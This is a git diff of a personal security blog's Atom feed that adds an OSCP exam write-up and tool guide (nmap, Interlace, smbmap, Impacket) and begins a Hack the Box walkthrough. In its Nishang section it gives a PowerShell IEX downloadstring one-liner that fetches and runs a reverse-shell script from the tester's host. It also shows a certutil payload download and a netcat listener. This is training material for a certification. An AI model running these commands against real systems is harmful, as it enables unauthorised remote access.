@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>cyb3rdan.com</title>
- <link href="https://cyb3rdan.com/atom.xml" rel="self"/>
- <link href="https://cyb3rdan.com/"/>
- <updated>2018-12-14T21:51:40+10:30</updated>
- <id>https://cyb3rdan.com</id>
+ <link href="http://localhost:4000/atom.xml" rel="self"/>
+ <link href="http://localhost:4000/"/>
+ <updated>2019-07-02T16:16:11+09:30</updated>
+ <id>http://localhost:4000</id>
  <author>
    <name>Daniel Souter</name>
    <email></email>
@@ -13,11 +13,188 @@
 
  
  <entry>
+   <title>OSCP</title>
+   <link href="http://localhost:4000/2019/07/01/oscp/"/>
+   <updated>2019-07-01T00:00:00+09:30</updated>
+   <id>http://localhost:4000/2019/07/01/oscp</id>
+   <content type="html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/oscp/oscp.png&quot; alt=&quot;oscp&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well it’s been a while and even though I mentioned in my first post that I would update here during my OSCP journey, study as well as life in general got in the way; so this is going to be a big update. Thankfully though, all that time spent away was well worth it since I did manage to pass the exam on the first attempt, after managing to get the flags on all lab machines. This was definitely one of the most amazing experiences of my life and I could not recommend it more for anyone else that is thinking about starting their OSCP journey. 
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-exam&quot;&gt;The exam&lt;/h2&gt;
+&lt;p&gt;My exam was proctored. The proctors were respectful, and never had any issues when I wanted to take a break. I did have to restart the webcam feed a few times during the process, but it was as simple as a quick refresh of the webpage and away it went again. I was using MacBook Pros for both my host machine and the webcam machine, since I had read previous recommendations to split these roles onto different machines due to the resource usage of the webcam application. This seemed to be good advice since the webcam machine did seem to be struggling more than my attacking machine at different periods, with the fan getting quite loud at times.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-tools&quot;&gt;The tools&lt;/h2&gt;
+&lt;p&gt;There are so many alternatives out there that will help you accomplish what the tools listed below can do, however these are the key tools that I used to get me through the OSCP labs and exam, and I found them all invaluable throughout my journey.&lt;/p&gt;
+
+&lt;h3 id=&quot;microsoft-onenote&quot;&gt;Microsoft OneNote&lt;/h3&gt;
+&lt;p&gt;I didn’t spend a lot of time investigating note taking applications prior to taking the PWK course, since I use OneNote already on a daily basis, and having the ability to sync to a number of devices including mobile devices, I really didn’t feel like I needed to go elsewhere. The one thing I did spend some time on prior to starting the course was creating a template that I could use for each host I exploit to dump all of my enumeration and recon notes. I ended up coming across a blog post solving the same issue for VulnHub and HackTheBox machines, and after running through a few of the lab machines with this template, I found it perfect for what I wanted. You can grab the template at &lt;a href=&quot;https://maikthulhu.github.io/2017-11-20-onenote-layout/&quot;&gt;https://maikthulhu.github.io/2017-11-20-onenote-layout/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I did make a few minor changes to it after a little while. The first was renaming the &lt;strong&gt;General Notes&lt;/strong&gt; section to &lt;strong&gt;Walkthrough&lt;/strong&gt; and from there I would basically copy and paste the entire walkthrough, including all screenshots, straight in to the OSCP lab/exam report and know that I would only have to make minor formatting changes once it was inside Microsoft Word. Then finally, I added a new page called &lt;strong&gt;Enumeration Scripts&lt;/strong&gt;, which had a number of sub-pages where I could paste the output of scripts like &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;, &lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker&quot;&gt;LinuxPrivChecker&lt;/a&gt;, &lt;a href=&quot;https://github.com/rasta-mouse/Sherlock&quot;&gt;Sherlock&lt;/a&gt;, &lt;a href=&quot;https://github.com/rasta-mouse/Watson&quot;&gt;Watson&lt;/a&gt;, &lt;a href=&quot;https://github.com/411Hall/JAWS&quot;&gt;JAWS&lt;/a&gt; and &lt;a href=&quot;https://github.com/GDSSecurity/Windows-Exploit-Suggester&quot;&gt;Windows Exploit Suggester&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;NMAP&lt;/h3&gt;
+&lt;p&gt;This is an obvious addition to the list and paired with another awesome tool &lt;a href=&quot;https://github.com/codingo/Interlace&quot;&gt;Interlace&lt;/a&gt;, which I will cover next, it makes for an amazing enumeration tool. I always start with some 3 basic scans first. These are:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/initial &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/tcp-allports &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--top-ports&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/udp-top-50 &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;where:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; skips host discovery and assumes the target is online&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; provides verbose output so you can see the scanning results immediately&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-sC&lt;/code&gt; scan using the NSE scripts in the default category. You can determine these using &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script-help default&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-sV&lt;/code&gt; determines service/version info&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-oN&lt;/code&gt; output the results in standard NMAP format
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; scan all 65535 ports&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;-sU --top-ports 50&lt;/code&gt; UDP scan of only the top 50 ports&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;$ip&lt;/code&gt; is the target IP address to scan&lt;/p&gt;
+
+&lt;p&gt;Once these scans have completed you will have all the information you need in order to begin your targeted enumeration. You may find yourself doing 2 more final scans if the TCP all ports scan returns additonal ports. For these I simply keep the same syntax as the first scan, and add the &lt;code class=&quot;highlighter-rouge&quot;&gt;-p&lt;/code&gt; option followed by the comma delimited addtional ports found to complete service detection and default NSE script scanning.&lt;/p&gt;
+
+&lt;h3 id=&quot;interlace&quot;&gt;Interlace&lt;/h3&gt;
+
+&lt;p&gt;Due to the time pressures of the OSCP exam I needed a way to run my nmap scans automatically for the machines assigned to me, and there was no way that I wanted a huge number of console windows open with a single command running in each. To the rescue came &lt;a href=&quot;https://github.com/codingo/Interlace&quot;&gt;Interlace&lt;/a&gt;. After reading an awesome blog post by &lt;a href=&quot;https://twitter.com/hakluke&quot;&gt;HakLuke&lt;/a&gt;, which you can find &lt;a href=&quot;https://medium.com/@hakluke/interlace-a-productivity-tool-for-pentesters-and-bug-hunters-automate-and-multithread-your-d18c81371d3d&quot;&gt;here&lt;/a&gt;, I decided that Interlace was exactly what I was after. While my usage was extremely simple, it worked exactly as I had hoped. My setup was as follows:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;create &lt;strong&gt;nmap-commands.txt&lt;/strong&gt; file inside of ~/Desktop/OSCP/exam/scripts/commands/ with the following contents.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; _output_/_target_-initial.txt _target_
+nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; _output_/_target_-tcp-allports.txt _target_
+nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--top-ports&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; _output_/_target_-udp-top50.txt _target_&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create &lt;strong&gt;targets.txt&lt;/strong&gt; file inside of ~/Desktop/OSCP/exam/scripts/targets/ with the IP addresses of the hosts assigned to me; 1 per line.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;1.1.1.1
+2.2.2.2
+3.3.3.3
+4.4.4.4
+5.5.5.5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Use Interlace to run &lt;strong&gt;ALL&lt;/strong&gt; nmap commands on &lt;strong&gt;ALL&lt;/strong&gt; targets at the same time.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;interlace &lt;span class=&quot;nt&quot;&gt;-tL&lt;/span&gt; ~/Desktop/OSCP/exam/scripts/targets/targets.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ~/Desktop/OSCP/exam/scripts/output &lt;span class=&quot;nt&quot;&gt;-cL&lt;/span&gt; ~/Desktop/OSCP/exam/scripts/commands/nmap-commands.txt &lt;span class=&quot;nt&quot;&gt;-threads&lt;/span&gt; 20&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;nishang-invoke-powershelltcpps1&quot;&gt;Nishang Invoke-PowerShellTcp.ps1&lt;/h3&gt;
+&lt;p&gt;So you’ve managed to get code execution on your target machine through a vulnerability in a web application. You’ve confirmed your target machine is running PowerShell and you want to get a reverse shell. &lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;Invoke-PowerShellTcp.ps1&lt;/a&gt; is the perfect tool to get you that shell!&lt;/p&gt;
+
+&lt;p&gt;In the following example we are using 1.2.3.4 as the IP address of your Kali machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Edit the script&lt;/strong&gt;&lt;br /&gt;
+Edit the script in your favourite editor and add the following at the very bottom under all existing content. This will mean that as soon as you call the script in the next stage, you will get your reverse shell instantly without having to call the Invoke-PowerShellTcp function after you call the script. You can change port 443 to whatever port you wish to send the reverse shell to on your Kali machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Invoke-PowerShellTcp &lt;span class=&quot;nt&quot;&gt;-Reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-IPAddress&lt;/span&gt; 1.2.3.4 &lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt; 443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Serve the script on Kali via HTTP&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Start up a netcat listener on Kali&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;nc -lvnp 443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Run the script from your vulnerable web application&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;powershell.exe IEX(new-object net.webclient).downloadstring('http://1.2.3.4/Invoke-PowerShellTcp.ps1')&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;32 or 64-Bit process?&lt;/strong&gt;&lt;br /&gt;
+When run on a 32-bit target machine the above command calling powershell.exe will obviously result in a 32-Bit process, but when you run the same command on a 64-Bit machine, you will still end up with a 32-Bit process. In order to end up with a 64-Bit process you must specify the full path to the 64-Bit PowerShell binary, which can be called using:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(new-object net.webclient).downloadstring('http://1.2.3.4/Invoke-PowerShellTcp.ps1')&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once you have a reverse shell you can run the following command to determine if your shell is 32 or 64-Bit.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;[Environment]::Is64BitProcess&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If your shell is running under a 64-Bit process the result will be &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;, otherwise the result will be &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is extremely handy to know as when you start running tools such as &lt;a href=&quot;https://github.com/rasta-mouse/Sherlock&quot;&gt;Sherlock&lt;/a&gt; or &lt;a href=&quot;https://github.com/rasta-mouse/Watson&quot;&gt;Watson&lt;/a&gt; to look for privilege escalation vulnerabilites, you may find you get different results under a 32-bit process as you do under a 64-Bit process. Make sure to run these scripts within each so that you don’t miss out on an obvious privesc!&lt;/p&gt;
+
+&lt;h3 id=&quot;certutil&quot;&gt;Certutil&lt;/h3&gt;
+&lt;p&gt;Need to download and save a file from a webserver to your target Windows machine once you have code execution or a reverse shell? The certutil binary was my goto for this, and it is as simple as the below command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;certutil -urlcache -split -f http://1.2.3.4/file-to-download.exe c:\users\public\downloads\file.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;impacket-smbserverpy&quot;&gt;Impacket smbserver.py&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py&quot;&gt;Impacket smbserver.py&lt;/a&gt; was such a lifesaver throughout this whole process when it comes to Windows based target machines, and while the PWK material was great and offered a bunch of solutions for transferring files, this impacket tool made file transfers a no brainer and this is exactly what you need during the exam.&lt;/p&gt;
+
+&lt;p&gt;Rather than have to echo a bunch of commands into a file in order to complete an FTP transfer, or even having to install and configure a TFTP server on your Kali machine, this simple one liner spins up an SMB server on your Kali machine in a directory you specify that allows you to simply use the built-in copy command inside of Windows in order to copy files between machines.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Installing the impacket tools&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt
+git clone https://github.com/SecureAuthCorp/impacket
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;impacket
+pip3 &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
+python3 setup.py &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once you have installed the tools they will be present in your PATH so you will be able to execute them without needing to specify the full path. You will see in the following example that I like to use a full stop or period to specify starting the server in my current working directory, which makes this as simple as using the python HTTP server to transfer to and from a Windows machine, &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -m http.server 80&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Starting the server&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;smbserver.py insert-share-name-here . -smb2support&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Copying from windows&lt;/strong&gt;&lt;br /&gt;
+For this example we will use the IP address 1.2.3.4 to represent our Kali machine that is running the SMB server. This assumes that you have write access to the destination directory, and that you are in the directory that you want to copy the file to.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;copy \\1.2.3.4\insert-share-name-here\nc.exe .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That’s it! Taking this one step further, once you have the SMB server running you can execute binaries or powershell scripts directly from this file share by using the UNC path, without having to write them to disk on your target machine.&lt;/p&gt;
+
+&lt;h3 id=&quot;smbversh&quot;&gt;smbver.sh&lt;/h3&gt;
+&lt;p&gt;One of the first things I noticed when I loaded the PWK 2018.3 Kali VM and begun enumerating the first SMB port on a remote target was that tools such as NMAP and enum4linux did not return the version of samba that was running on the target. There are a buch of posts on the Internet talking about this, and thanks to a blog post by &lt;a href=&quot;https://0xdf.gitlab.io/&quot;&gt;0xdf&lt;/a&gt; I stumbled across the following bash script. You can find the orignal post on smb enumeration &lt;a href=&quot;https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#enum4linux&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Author: rewardone&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Description:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Requires root or enough permissions to use tcpdump&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Will listen for the first 7 packets of a null login&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# and grab the SMB Version&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Notes:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Will sometimes not capture or will print multiple&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# lines. May need to run a second time for success.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: ./smbver.sh RHOST {RPORT}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
+if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;139&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi
+&lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-s0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tap0 src &lt;span class=&quot;nv&quot;&gt;$rhost&lt;/span&gt; and port &lt;span class=&quot;nv&quot;&gt;$rport&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 7 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;samba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;s.a.m&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'UnixSamba.*[0-9a-z]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; &amp;amp; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rhost&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &quot;&lt;/span&gt; &amp;amp;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&quot;&lt;/span&gt; | smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rhost&lt;/span&gt; 1&amp;gt;/dev/null 2&amp;gt;/dev/null
+&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.5 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It will return a result that looks similar to:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;UnixSamba 227a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This output simply means version 2.2.7a and from this you can use something like &lt;a href=&quot;https://www.exploit-db.com/searchsploit&quot;&gt;SearchSploit&lt;/a&gt; or go direct to exploit-db.com in order to search for known exploits.&lt;/p&gt;
+
+&lt;h3 id=&quot;smbmap&quot;&gt;smbmap&lt;/h3&gt;
+&lt;p&gt;Once you have run nmap and discovered that port TCP 139 or 445 is open, there are a number of different tools that you can go to to enumerate SMB. While you can always fall back to smbclient to complete your enumeration with something like &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L \\1.2.3.4&lt;/code&gt;, I found that once I had identified an open share that I would always want to at least list the contents of that share. With smbmap you can do it all. I would normally run the following commands:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-none&quot; data-lang=&quot;none&quot;&gt;smbmap -H 1.2.3.4 -u anonymous  
+
+smbmap -H 1.2.3.4 /share -R &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;obs-studio&quot;&gt;OBS Studio&lt;/h3&gt;
+&lt;p&gt;While not an offensive tool, &lt;a href=&quot;https://obsproject.com/&quot;&gt;OBS Studio&lt;/a&gt; was still a massive help for me during my exam. I had read a few comments about others asking the proctors if they were allowed to record their own screens during the exam, so in the event you realise you missed a screenshot when you are writing your report, you are able to jump back through the recording and get your missing screenshot. I asked the proctors if this was allowed, and while they said yes, it came with a recommendation to delete the recording immediately once the report had been sumbitted. The last thing you want is for a full 24hr feed of your exam to end up in the hands of someone else and cause you to lose your certification, so I deleted mine immediately as per the recommendation.&lt;/p&gt;
+
+&lt;p&gt;I chose to use OBS Studio for this as it is open source, offers flexibility regarding output file formats and supports all major operating systems.&lt;/p&gt;
+
+&lt;p&gt;It turns out I only used my recording once, and it was not a critical screenshot, but it was nice knowing I had the recording just in case.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-summary&quot;&gt;The Summary&lt;/h2&gt;
+&lt;p&gt;As I said at the beginning, this process was absolutely amazing and I would definitely recommend it to anyone considering getting their OSCP. For everyone postponing signing up for their labs, there is really no good time to start this process, unless you can commit 100% of your time to it. It will consume all of your free time and you will spend less time with your family and friends. Just start the process and make it work for you. I had 90 days of lab access, while still working full time, and while I probably didn’t need that long it really did help allow me to pace myself and not get completely burnt out, while not abandoning my family enitely.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
    <title>Hack the Box - Active</title>
-   <link href="https://cyb3rdan.com/2018/12/13/Hack-the-Box-Active/"/>
+   <link href="http://localhost:4000/2018/12/13/Hack-the-Box-Active/"/>
    <updated>2018-12-13T00:00:00+10:30</updated>
-   <id>https://cyb3rdan.com/2018/12/13/Hack-the-Box-Active</id>
-   <content type="html">&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-badge.jpg&quot; alt=&quot;active-badge&quot; class=&quot;img-responsive&quot; /&gt;
+   <id>http://localhost:4000/2018/12/13/Hack-the-Box-Active</id>
+   <content type="html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/active/active-badge.jpg&quot; alt=&quot;active-badge&quot; class=&quot;img-responsive&quot; /&gt;
 &lt;!--more--&gt;&lt;/p&gt;
 
 &lt;ul&gt;
@@ -26,7 +203,7 @@
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; initial 10.10.10.100&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-nmap.jpg&quot; alt=&quot;nmap-scan&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/active/active-nmap.jpg&quot; alt=&quot;nmap-scan&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;tested and confirmed that SMB null session could be established using:&lt;/li&gt;
@@ -67,11 +244,11 @@
 
